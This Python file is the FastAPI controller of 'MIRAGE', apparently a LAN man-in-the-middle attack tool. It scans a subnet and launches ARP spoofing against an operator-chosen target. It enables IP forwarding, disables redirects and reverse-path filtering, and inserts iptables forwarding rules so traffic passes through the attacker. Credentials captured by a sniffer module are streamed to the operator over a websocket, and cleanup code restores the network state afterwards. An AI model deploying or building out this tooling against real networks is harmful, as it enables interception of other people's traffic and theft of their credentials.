from __future__ import annotations

import asyncio
import ipaddress
import json
import os
import re
import secrets
import shutil
import subprocess
import tempfile
import uuid
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any, Callable

import uvicorn
from fastapi import FastAPI, Query, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

from core.mitm import ARPSpoofer
from core.network import NetworkScanner
from core.sniffer import SnifferEngine

from dotenv import load_dotenv
load_dotenv()

ACCESS_TOKEN = os.getenv("MIRAGE_ACCESS_TOKEN")

if not ACCESS_TOKEN:
    ACCESS_TOKEN = secrets.token_urlsafe(24)
    print(
        "\n[!] MIRAGE_ACCESS_TOKEN is not set."
        "\n[!] Generated temporary access token:"
        f"\n    {ACCESS_TOKEN}\n"
    )


class CommandError(RuntimeError):
    pass


def run_command(
    command: list[str],
    *,
    timeout: float = 10.0,
    capture_output: bool = True,
) -> subprocess.CompletedProcess[str]:
    try:
        result = subprocess.run(
            command,
            capture_output=capture_output,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise CommandError(
            f"Command timed out after {timeout}s: {' '.join(command)}"
        ) from exc
    except OSError as exc:
        raise CommandError(
            f"Could not execute command {' '.join(command)}: {exc}"
        ) from exc

    if result.returncode != 0:
        stderr = (result.stderr or "").strip()
        message = f"Command failed ({result.returncode}): {' '.join(command)}"

        if stderr:
            message = f"{message} | {stderr}"

        raise CommandError(message)

    return result


class NetworkSnapshot:
    SYSCTL_KEYS = (
        "net.ipv4.ip_forward",
        "net.ipv4.conf.all.send_redirects",
        "net.ipv4.conf.default.send_redirects",
    )

    def __init__(self, interface: str):
        self.interface = interface
        self.sysctl_keys = (
            *self.SYSCTL_KEYS,
            f"net.ipv4.conf.{interface}.send_redirects",
            "net.ipv4.conf.all.rp_filter",
            f"net.ipv4.conf.{interface}.rp_filter",
        )

        self.session_dir = Path(
            tempfile.mkdtemp(prefix="mirage_", mode=0o700)
        )

        self.iptables_path = self.session_dir / "iptables.save"
        self.sysctl_path = self.session_dir / "sysctl.json"
        self.captured = False

    def capture(self) -> None:
        try:
            iptables = run_command(
                ["iptables-save"],
                timeout=10,
            )

            if not iptables.stdout.strip():
                raise CommandError("iptables-save returned an empty snapshot")

            self.iptables_path.write_text(
                iptables.stdout,
                encoding="utf-8",
            )

            sysctl_state: dict[str, str] = {}

            for key in self.sysctl_keys:
                result = run_command(
                    ["sysctl", "-n", key],
                    timeout=5,
                )

                value = result.stdout.strip()

                if not value:
                    raise CommandError(
                        f"Empty sysctl value returned for {key}"
                    )

                sysctl_state[key] = value

            self.sysctl_path.write_text(
                json.dumps(sysctl_state, indent=2),
                encoding="utf-8",
            )

            self.captured = True

        except Exception:
            self.dispose()
            raise

    def restore(self) -> list[str]:
        errors: list[str] = []

        if not self.captured:
            errors.append("Network snapshot was never captured")
            return errors

        try:
            state = json.loads(
                self.sysctl_path.read_text(
                    encoding="utf-8"
                )
            )
        except Exception as exc:
            errors.append(
                f"Failed to load sysctl snapshot: {exc}"
            )
            state = {}

        for key, value in state.items():
            try:
                run_command(
                    ["sysctl", "-w", f"{key}={value}"],
                    timeout=5,
                )
            except Exception as exc:
                errors.append(
                    f"Failed to restore {key}: {exc}"
                )

        try:
            run_command(
                ["iptables-restore", str(self.iptables_path)],
                timeout=10,
            )
        except Exception as exc:
            errors.append(
                f"Failed to restore iptables: {exc}"
            )

        return errors

    def dispose(self) -> None:
        shutil.rmtree(
            self.session_dir,
            ignore_errors=True,
        )


class MirageController:
    def __init__(self):
        self.scanner_engine: NetworkScanner | None = None
        self.mitm_engine: ARPSpoofer | None = None
        self.sniffer_engine: SnifferEngine | None = None

        self.selected_interface: str | None = None

        self.is_mitm_active = False
        self.network_transaction_active = False

        self.snapshot: NetworkSnapshot | None = None

        self.fw_chain: str | None = None
        self.fw_jump_installed = False

    def _new_chain_name(self) -> str:
        return f"MIRAGE_{uuid.uuid4().hex[:12].upper()}"

    def _create_firewall_scope(
        self,
        target_ip: str,
    ) -> None:
        chain = self._new_chain_name()
        self.fw_chain = chain

        try:
            run_command(
                ["iptables", "-N", chain],
                timeout=5,
            )

            run_command(
                [
                    "iptables",
                    "-I",
                    "FORWARD",
                    "1",
                    "-j",
                    chain,
                ],
                timeout=5,
            )

            self.fw_jump_installed = True

            run_command(
                [
                    "iptables",
                    "-A",
                    chain,
                    "-s",
                    target_ip,
                    "-j",
                    "ACCEPT",
                ],
                timeout=5,
            )

            run_command(
                [
                    "iptables",
                    "-A",
                    chain,
                    "-d",
                    target_ip,
                    "-j",
                    "ACCEPT",
                ],
                timeout=5,
            )

        except Exception:
            self._remove_owned_firewall_objects()
            raise

    def _remove_owned_firewall_objects(
        self,
    ) -> list[str]:
        errors: list[str] = []
        chain = self.fw_chain

        if not chain:
            return errors

        if self.fw_jump_installed:
            try:
                run_command(
                    [
                        "iptables",
                        "-D",
                        "FORWARD",
                        "-j",
                        chain,
                    ],
                    timeout=5,
                )
            except Exception as exc:
                errors.append(
                    f"Failed to remove MIRAGE jump: {exc}"
                )
            finally:
                self.fw_jump_installed = False

        try:
            run_command(
                ["iptables", "-F", chain],
                timeout=5,
            )
        except Exception as exc:
            errors.append(
                f"Failed to flush MIRAGE chain: {exc}"
            )

        try:
            run_command(
                ["iptables", "-X", chain],
                timeout=5,
            )
        except Exception as exc:
            errors.append(
                f"Failed to delete MIRAGE chain: {exc}"
            )

        self.fw_chain = None

        return errors

    def begin_network_transaction(
        self,
        interface: str,
        target_ip: str,
    ) -> None:
        if self.network_transaction_active:
            raise RuntimeError(
                "A network transaction is already active"
            )

        self.selected_interface = interface

        snapshot = NetworkSnapshot(interface)
        snapshot.capture()

        self.snapshot = snapshot
        self.network_transaction_active = True

        try:
            self._create_firewall_scope(target_ip)

            run_command(
                [
                    "sysctl",
                    "-w",
                    "net.ipv4.ip_forward=1",
                ],
                timeout=5,
            )

            run_command(
                [
                    "sysctl",
                    "-w",
                    "net.ipv4.conf.all.send_redirects=0",
                ],
                timeout=5,
            )

            run_command(
                [
                    "sysctl",
                    "-w",
                    f"net.ipv4.conf.{interface}.send_redirects=0",
                ],
                timeout=5,
            )

            run_command(
                [
                    "sysctl",
                    "-w",
                    "net.ipv4.conf.all.rp_filter=0",
                ],
                timeout=5,
            )

            run_command(
                [
                    "sysctl",
                    "-w",
                    f"net.ipv4.conf.{interface}.rp_filter=0",
                ],
                timeout=5,
            )

        except Exception:
            raise

    def rollback_network_transaction(self) -> list[str]:
        errors: list[str] = []

        if not self.network_transaction_active:
            return errors

        snapshot = self.snapshot

        if snapshot is None:
            errors.append(
                "Transaction is active but no network snapshot exists"
            )
            return errors

        restore_errors = snapshot.restore()
        errors.extend(restore_errors)

        if restore_errors:
            emergency_errors = (
                self._remove_owned_firewall_objects()
            )
            errors.extend(emergency_errors)

            self.is_mitm_active = False

            return errors

        self.network_transaction_active = False
        self.is_mitm_active = False

        self.fw_chain = None
        self.fw_jump_installed = False

        self.snapshot = None

        snapshot.dispose()

        return errors

    async def cleanup(
        self,
        on_log: Callable[[str], None],
    ) -> None:
        errors: list[str] = []

        was_active = (
            self.is_mitm_active
            or self.network_transaction_active
        )

        if self.mitm_engine is not None:
            try:
                await asyncio.to_thread(
                    self.mitm_engine.stop
                )
            except Exception as exc:
                errors.append(
                    f"MITM cleanup failed: {exc}"
                )
            finally:
                self.mitm_engine = None

        if self.sniffer_engine is not None:
            try:
                await asyncio.to_thread(
                    self.sniffer_engine.stop
                )
            except Exception as exc:
                errors.append(
                    f"Sniffer cleanup failed: {exc}"
                )
            finally:
                self.sniffer_engine = None

        if self.scanner_engine is not None:
            try:
                await asyncio.to_thread(
                    self.scanner_engine.stop
                )
            except Exception as exc:
                errors.append(
                    f"Scanner cleanup failed: {exc}"
                )
            finally:
                self.scanner_engine = None

        if self.network_transaction_active:
            rollback_errors = (
                self.rollback_network_transaction()
            )
            errors.extend(rollback_errors)

        self.is_mitm_active = False

        if errors:
            on_log(
                "[-] Cleanup completed with errors:\n"
                + "\n".join(
                    f"    - {item}"
                    for item in errors
                )
            )
        elif was_active:
            on_log(
                "[*] Cleanup successful. "
                "Previous network state restored."
            )

    @property
    def busy(self) -> bool:
        return (
            self.network_transaction_active
            or self.is_mitm_active
            or self.mitm_engine is not None
        )


class ConnectionManager:
    def __init__(self):
        self.active_connections: set[WebSocket] = set()
        self.operator: WebSocket | None = None
        self.operator_lock = asyncio.Lock()

    async def connect(
        self,
        websocket: WebSocket,
    ) -> bool:
        async with self.operator_lock:
            if self.operator is not None:
                await websocket.accept()

                try:
                    await websocket.send_json(
                        {
                            "type": "error",
                            "message": (
                                "MIRAGE is already controlled "
                                "by another operator."
                            ),
                        }
                    )
                finally:
                    await websocket.close(
                        code=1008
                    )

                return False

            await websocket.accept()

            self.operator = websocket
            self.active_connections.add(
                websocket
            )

            return True

    async def disconnect(
        self,
        websocket: WebSocket,
    ) -> None:
        async with self.operator_lock:
            self.active_connections.discard(
                websocket
            )

            if self.operator is websocket:
                self.operator = None

    async def broadcast(
        self,
        message: dict[str, Any],
    ) -> None:
        connections = tuple(
            self.active_connections
        )

        dead: list[WebSocket] = []

        for connection in connections:
            try:
                await connection.send_json(
                    message
                )
            except Exception:
                dead.append(connection)

        for connection in dead:
            await self.disconnect(
                connection
            )


manager = ConnectionManager()


@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.loop = (
        asyncio.get_running_loop()
    )
    app.state.engine_lock = asyncio.Lock()
    app.state.controller = MirageController()

    try:
        yield
    finally:
        await app.state.controller.cleanup(
            lambda message: print(message)
        )


app = FastAPI(
    lifespan=lifespan
)

app.mount(
    "/static",
    StaticFiles(directory="static"),
    name="static",
)


def schedule_broadcast(
    message: dict[str, Any],
    loop: asyncio.AbstractEventLoop,
) -> None:
    if loop.is_closed():
        return

    if not loop.is_running():
        return

    future = asyncio.run_coroutine_threadsafe(
        manager.broadcast(message),
        loop,
    )

    def consume_exception(
        completed: asyncio.Future,
    ) -> None:
        try:
            completed.result()
        except Exception as exc:
            print(
                f"[-] WebSocket broadcast failed: {exc}"
            )

    future.add_done_callback(
        consume_exception
    )


def on_log(
    message: str,
    loop: asyncio.AbstractEventLoop,
) -> None:
    schedule_broadcast(
        {
            "type": "log",
            "message": message,
        },
        loop,
    )


def on_host(
    hosts: list[dict[str, Any]],
    loop: asyncio.AbstractEventLoop,
) -> None:
    schedule_broadcast(
        {
            "type": "hosts",
            "data": hosts,
        },
        loop,
    )


def on_credentials(
    credentials: str,
    loop: asyncio.AbstractEventLoop,
) -> None:
    schedule_broadcast(
        {
            "type": "credential",
            "data": credentials,
        },
        loop,
    )


def on_traffic(
    rx: float,
    tx: float,
    loop: asyncio.AbstractEventLoop,
) -> None:
    schedule_broadcast(
        {
            "type": "traffic",
            "rx": rx,
            "tx": tx,
        },
        loop,
    )


def on_packet(
    packets: list[dict[str, Any]],
    loop: asyncio.AbstractEventLoop,
) -> None:
    schedule_broadcast(
        {
            "type": "packet",
            "data": packets,
        },
        loop,
    )


def get_interfaces() -> list[str]:
    result = run_command(
        [
            "ip",
            "-o",
            "link",
            "show",
        ],
        timeout=5,
    )

    interfaces: list[str] = []

    for line in result.stdout.splitlines():
        parts = line.split(":", 2)

        if len(parts) < 2:
            continue

        interface = parts[1].strip()

        if interface and interface != "lo":
            interfaces.append(interface)

    if not interfaces:
        raise RuntimeError(
            "No usable network interfaces found"
        )

    return interfaces


def get_subnet(
    interface: str,
) -> str:
    result = run_command(
        [
            "ip",
            "-o",
            "-4",
            "addr",
            "show",
            "dev",
            interface,
        ],
        timeout=5,
    )

    for line in result.stdout.splitlines():
        fields = line.split()

        if "inet" not in fields:
            continue

        index = fields.index("inet")

        if index + 1 >= len(fields):
            continue

        return fields[index + 1]

    raise RuntimeError(
        f"No IPv4 address found on {interface}"
    )


def get_gateway() -> str:
    result = run_command(
        [
            "ip",
            "-4",
            "route",
            "show",
            "default",
        ],
        timeout=5,
    )

    for line in result.stdout.splitlines():
        fields = line.split()

        if (
            len(fields) >= 3
            and fields[0] == "default"
            and fields[1] == "via"
        ):
            return fields[2]

    raise RuntimeError(
        "No default IPv4 gateway found"
    )


@app.get("/api/interfaces")
async def api_interfaces():
    try:
        return {
            "interfaces": get_interfaces()
        }
    except Exception as exc:
        return {
            "interfaces": [],
            "error": str(exc),
        }


@app.get("/")
async def get_index():
    path = Path("static") / "index.html"

    if not path.is_file():
        return HTMLResponse(
            "<h1>MIRAGE</h1><p>Frontend not found.</p>",
            status_code=500,
        )

    return HTMLResponse(
        path.read_text(
            encoding="utf-8"
        )
    )


@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket,
    token: str = Query(...),
):
    if not secrets.compare_digest(
        token,
        ACCESS_TOKEN,
    ):
        await websocket.close(
            code=1008
        )
        return

    if not await manager.connect(
        websocket
    ):
        return

    loop: asyncio.AbstractEventLoop = (
        app.state.loop
    )

    controller: MirageController = (
        app.state.controller
    )

    try:
        while True:
            raw = await websocket.receive_text()

            try:
                message = json.loads(raw)
            except json.JSONDecodeError:
                on_log(
                    "[-] Invalid JSON command.",
                    loop,
                )
                continue

            if not isinstance(message, dict):
                on_log(
                    "[-] Command payload must be an object.",
                    loop,
                )
                continue

            action = message.get("action")

            if not isinstance(action, str):
                on_log(
                    "[-] Missing command action.",
                    loop,
                )
                continue

            async with app.state.engine_lock:

                if action == "set_interface":
                    requested = message.get(
                        "interface"
                    )

                    if not isinstance(
                        requested,
                        str,
                    ):
                        on_log(
                            "[-] Invalid interface.",
                            loop,
                        )
                        continue

                    available = get_interfaces()

                    if requested not in available:
                        on_log(
                            f"[-] Interface '{requested}' "
                            "is unavailable.",
                            loop,
                        )
                        continue

                    if (
                        requested
                        == controller.selected_interface
                    ):
                        continue

                    await controller.cleanup(
                        lambda msg: on_log(
                            msg,
                            loop,
                        )
                    )

                    controller.selected_interface = (
                        requested
                    )

                    on_log(
                        f"[*] Interface switched to {requested}.",
                        loop,
                    )

                elif action == "start_scan":
                    if (
                        controller.selected_interface
                        is None
                    ):
                        on_log(
                            "[-] No interface selected.",
                            loop,
                        )
                        continue

                    if (
                        controller.scanner_engine
                        is not None
                        and controller.scanner_engine.is_alive()
                    ):
                        on_log(
                            "[-] Scanner already running.",
                            loop,
                        )
                        continue

                    subnet = get_subnet(
                        controller.selected_interface
                    )

                    controller.scanner_engine = (
                        NetworkScanner(
                            controller.selected_interface,
                            lambda msg: on_log(
                                msg,
                                loop,
                            ),
                            lambda hosts: on_host(
                                hosts,
                                loop,
                            ),
                        )
                    )

                    controller.scanner_engine.start(
                        subnet
                    )

                elif action == "stop_scan":
                    scanner = (
                        controller.scanner_engine
                    )

                    if scanner is None:
                        continue

                    try:
                        await asyncio.to_thread(
                            scanner.stop
                        )
                    except Exception as exc:
                        on_log(
                            f"[-] Scanner stop failed: {exc}",
                            loop,
                        )
                    finally:
                        controller.scanner_engine = None

                elif action == "start_mitm":
                    if controller.busy:
                        on_log(
                            "[-] MIRAGE is already busy.",
                            loop,
                        )
                        continue

                    target_ip = message.get(
                        "target_ip"
                    )

                    target_mac = message.get(
                        "target_mac"
                    )

                    if not isinstance(
                        target_ip,
                        str,
                    ):
                        on_log(
                            "[-] Invalid target IP.",
                            loop,
                        )
                        continue

                    try:
                        target_ip = str(
                            ipaddress.ip_address(
                                target_ip
                            )
                        )
                    except ValueError:
                        on_log(
                            "[-] Invalid target IP.",
                            loop,
                        )
                        continue

                    if not isinstance(
                        target_mac,
                        str,
                    ):
                        target_mac = ""

                    if (
                        controller.selected_interface
                        is None
                    ):
                        on_log(
                            "[-] No interface selected.",
                            loop,
                        )
                        continue

                    try:
                        gateway = get_gateway()

                        on_log(
                            "[*] Starting network transaction.",
                            loop,
                        )

                        controller.begin_network_transaction(
                            controller.selected_interface,
                            target_ip,
                        )

                        sniffer = SnifferEngine(
                            controller.selected_interface,
                            target_ip,
                            target_mac,
                            lambda msg: on_log(
                                msg,
                                loop,
                            ),
                            lambda creds: on_credentials(
                                creds,
                                loop,
                            ),
                            lambda rx, tx: on_traffic(
                                rx,
                                tx,
                                loop,
                            ),
                            lambda packets: on_packet(
                                packets,
                                loop,
                            ),
                        )

                        controller.sniffer_engine = (
                            sniffer
                        )

                        sniffer.start()

                        spoofer = ARPSpoofer(
                            controller.selected_interface,
                            target_ip,
                            gateway,
                            target_mac,
                            lambda msg: on_log(
                                msg,
                                loop,
                            ),
                        )

                        controller.mitm_engine = (
                            spoofer
                        )

                        spoofer.start()

                        controller.is_mitm_active = True

                        on_log(
                            "[*] MIRAGE MITM session started.",
                            loop,
                        )

                    except Exception as exc:
                        on_log(
                            f"[-] MITM start failed: {exc}",
                            loop,
                        )

                        await controller.cleanup(
                            lambda msg: on_log(
                                msg,
                                loop,
                            )
                        )

                elif action == "stop_mitm":
                    await controller.cleanup(
                        lambda msg: on_log(
                            msg,
                            loop,
                        )
                    )

                else:
                    on_log(
                        f"[-] Unknown action: {action}",
                        loop,
                    )

    except WebSocketDisconnect:
        pass

    except Exception as exc:
        on_log(
            f"[-] WebSocket error: {exc}",
            loop,
        )

    finally:
        await controller.cleanup(
            lambda msg: on_log(
                msg,
                loop,
            )
        )

        await manager.disconnect(
            websocket
        )


if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="127.0.0.1",
        port=9000,
        reload=False,
    )